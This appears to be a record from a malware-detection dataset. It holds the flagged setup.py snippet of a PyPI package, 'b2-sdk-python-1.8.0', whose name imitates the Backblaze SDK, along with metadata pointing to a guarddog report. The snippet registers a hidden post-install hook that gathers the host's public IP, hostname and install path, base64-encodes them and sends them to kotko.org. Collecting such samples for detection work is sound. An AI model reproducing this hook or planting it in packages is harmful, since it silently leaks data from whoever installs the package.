[
  {
    "pyfile": "setup.py",
    "malicious_code_snippets": "import atexit\nimport requests\nimport os\nimport pathlib\nimport base64\nfrom distutils.command.install import install\n\ncompany = \"pypi+\"+\"backblaze-b2-samples/b2fs4chia\"+\"+\"\nname = \"b2-sdk-python\"\n\nclass new_install(install):\n    def __init__(self, *args, **kwargs):\n        super(new_install, self).__init__(*args, **kwargs)\n        atexit.register(_post_install)\n\ndef _post_install():\n    file_name = 'bykotko.txt'\n    f = open(file_name, 'a+')  # open file in append mode\n    f.write('kotko')\n    f.close()\n\n    ip = requests.get('https://api.ipify.org').text\n    ipText = format(ip);\n    myhost = os.uname()[1]\n    currentPath = requests.utils.quote(bytes(pathlib.Path(__file__).parent.absolute()));\n\n    PYdata = { \"ip\": ipText,\n               \"host\": myhost,\n               \"path\": currentPath, }\n    PYdataS = ipText+\",\"+myhost+\",(\"+currentPath+\")\"\n\n    message = PYdataS\n    message_bytes = message.encode('ascii')\n    base64_bytes = base64.b64encode(message_bytes)\n    base64_message = base64_bytes.decode('ascii')\n\n    r  = requests.get(\"https://kotko.org?\"+company+name+\"=\"+base64_message)\n"
  },
  {
    "metadata": {
      "package_name": "b2-sdk-python-1.8.0",
      "report_path": "/home/blue/PyPIAgent/Codes/tooldetect/detect_output/guarddog/malware/b2-sdk-python-1.8.0.txt"
    }
  }
]